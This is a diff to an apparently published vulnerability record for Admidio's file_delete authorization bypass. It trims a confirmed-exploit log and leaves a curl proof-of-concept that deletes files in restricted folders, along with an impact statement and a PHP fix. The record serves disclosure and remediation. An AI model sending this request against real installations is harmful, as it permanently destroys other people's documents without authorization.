@@ -50,40 +50,36 @@ summary: "Admidio: Authorization bypass in file_delete enables cross-folder file
   \ 3 — Delete file from restricted folder using the upload folder UUID as bypass:**\n\n```bash\n\
   curl -b /tmp/admidio_cookies.txt \\\n  -X POST \"http://TARGET/modules/documents-files.php?mode=file_delete&file_uuid=PRIVATE_FILE_UUID&folder_uuid=UPLOAD_FOLDER_UUID\"\
   \ \\\n  -d \"adm_csrf_token=${AUTH_CSRF}\"\n```\n\n**Expected response:** `{\"status\":\"\
-  success\"}`\n\n**Confirmed on Docker — Admidio v5.0.9 (`admidio/admidio:v5.0.9`):**\n\n```\n\
-  [*] Login CSRF: qhlOt8RB12vIuzBYD4eUVDk1VlVKqN\n[+] Authenticated as 'testmember'\n[*] Operation\
-  \ CSRF: EacPuqIWUKVIb7PcVrMypikUrblhhn\n[*] Sending file_delete for 93dc6280-4332-11f1-bba7-0242ac110003\
-  \ via folder bypass...\n[*] HTTP 200: {\"status\":\"success\"}\n\n[!!!] VULNERABLE — file\
-  \ deleted without upload rights on target folder\n      Deleted file UUID: 93dc6280-4332-11f1-bba7-0242ac110003\n\
-  ```\n\n`testmember` holds upload rights **only** on `UploadFolder`. `secret2.txt` (UUID `93dc6280-...-bba7-...`)\
-  \ resided in `PrivateFolder` and was permanently deleted from both the database and filesystem.\n\
-  \n---\n\n### Impact\n\nAn authenticated Admidio member with legitimate upload access to **any\
-  \ one folder** can permanently delete files from **any other folder** to which they have view\
-  \ access — without authorization. In organizations where upload rights are delegated by role\
-  \ (e.g., team leads upload to their own folder, view-only everywhere else), this enables cross-folder\
-  \ sabotage and permanent destruction of shared documents.\n\n**Business Impact:** Data loss,\
-  \ destruction of shared organizational documents, and compliance violations in organizations\
-  \ relying on Admidio for document management.\n\n### Remediation\n\nIn the `file_delete` handler,\
-  \ after loading the file via `getFileForDownload()`, verify upload rights against the file's\
-  \ **actual parent folder** — not the URL-supplied `folder_uuid`:\n\n```php\ncase 'file_delete':\n\
-  \    SecurityUtils::validateCsrfToken($_POST['adm_csrf_token']);\n    $file = new File($gDb);\n\
-  \    $file->getFileForDownload($getFileUUID);\n\n    // Verify upload rights on the file's\
-  \ actual parent folder\n    $parentFolder = new Folder($gDb);\n    $parentFolder->readDataById((int)$file->getValue('fil_fol_id'));\n\
-  \    if (!$parentFolder->hasUploadRight()) {\n        $gMessage->show($gL10n->get('SYS_NO_RIGHTS'));\n\
-  \    }\n\n    $file->delete();\n    echo json_encode(array('status' => 'success'));\n    break;\n\
-  ```\n\n**Alternative fix:** Remove the top-level `folder_uuid` check for `file_delete` entirely\
-  \ and move a proper upload-rights verification into the `file_delete` case as the sole authority\
-  \ for authorization.\n\n**Defense-in-depth recommendations:**\n\n- Audit all other modes in\
-  \ `documents-files.php` (e.g., `folder_delete`, `file_rename`) for the same pattern of trusting\
-  \ `folder_uuid` from the URL instead of the resource's actual parent.\n- Add an integration\
-  \ test asserting a user with upload rights on Folder A cannot perform destructive operations\
-  \ on files in Folder B.\n- Consider centralizing authorization in a single helper (e.g., `assertUploadRightOnFile($fileUuid)`)\
-  \ to eliminate the URL-parameter trust-boundary issue across the codebase.\n\n---\n\n### Credits\n\
-  \n- Researcher: Vishal Kumar B - https://github.com/VishaaLlKumaaRr  - Security Researcher\
-  \ & Penetration Tester\n- Disclosure: Responsible disclosure to Admidio maintainers\n\n###\
-  \ Resources\n\n- [GHSA-rmpj-3x5m-9m5f](https://github.com/Admidio/admidio/security/advisories/GHSA-rmpj-3x5m-9m5f)\
+  success\"}`\n\n`testmember` holds upload rights **only** on `UploadFolder`. `secret2.txt`\
+  \ (UUID `93dc6280-...-bba7-...`) resided in `PrivateFolder` and was permanently deleted from\
+  \ both the database and filesystem.\n\n---\n\n### Impact\n\nAn authenticated Admidio member\
+  \ with legitimate upload access to **any one folder** can permanently delete files from **any\
+  \ other folder** to which they have view access — without authorization. In organizations\
+  \ where upload rights are delegated by role (e.g., team leads upload to their own folder,\
+  \ view-only everywhere else), this enables cross-folder sabotage and permanent destruction\
+  \ of shared documents.\n\n**Business Impact:** Data loss, destruction of shared organizational\
+  \ documents, and compliance violations in organizations relying on Admidio for document management.\n\
+  \n---\n\n### Remediation\n\nIn the `file_delete` handler, after loading the file via `getFileForDownload()`,\
+  \ verify upload rights against the file's **actual parent folder** — not the URL-supplied\
+  \ `folder_uuid`:\n\n```php\ncase 'file_delete':\n    SecurityUtils::validateCsrfToken($_POST['adm_csrf_token']);\n\
+  \    $file = new File($gDb);\n    $file->getFileForDownload($getFileUUID);\n    // Verify\
+  \ upload rights on the file's actual parent folder\n    $parentFolder = new Folder($gDb);\n\
+  \    $parentFolder->readDataById((int)$file->getValue('fil_fol_id'));\n    if (!$parentFolder->hasUploadRight())\
+  \ {\n        $gMessage->show($gL10n->get('SYS_NO_RIGHTS'));\n    }\n    $file->delete();\n\
+  \    echo json_encode(array('status' => 'success'));\n    break;\n```\n\n**Alternative fix:**\
+  \ Remove the top-level `folder_uuid` check for `file_delete` entirely and move a proper upload-rights\
+  \ verification into the `file_delete` case as the sole authority for authorization.\n\n**Defense-in-depth\
+  \ recommendations:**\n\n- Audit all other modes in `documents-files.php` (e.g., `folder_delete`,\
+  \ `file_rename`) for the same pattern of trusting `folder_uuid` from the URL instead of the\
+  \ resource's actual parent.\n- Add an integration test asserting a user with upload rights\
+  \ on Folder A cannot perform destructive operations on files in Folder B.\n- Consider centralizing\
+  \ authorization in a single helper (e.g., `assertUploadRightOnFile($fileUuid)`) to eliminate\
+  \ the URL-parameter trust-boundary issue across the codebase.\n\n---\n\n### Credits\n\n- Researcher:\
+  \ Vishal Kumar B - https://github.com/VishaaLlKumaaRr - Security Researcher & Penetration\
+  \ Tester\n- Disclosure: Responsible disclosure to Admidio maintainers\n\n---\n\n### References\n\
+  \n- [GHSA-rmpj-3x5m-9m5f](https://github.com/Admidio/admidio/security/advisories/GHSA-rmpj-3x5m-9m5f)\
   \ — Prior incomplete fix, patched in v5.0.7\n- [CWE-862: Missing Authorization](https://cwe.mitre.org/data/definitions/862.html)\n\
-  - [CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html"
+  - [CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)"
 impacted_packages:
   - purl: pkg:composer/admidio/admidio
     affected_versions: vers:composer/<=5.0.9
@@ -113,4 +109,4 @@ references:
     reference_id:
   - url: https://github.com/Admidio/admidio/security/advisories/GHSA-rmpj-3x5m-9m5f
     reference_type:
-    reference_id:
+    reference_id: GHSA-rmpj-3x5m-9m5f
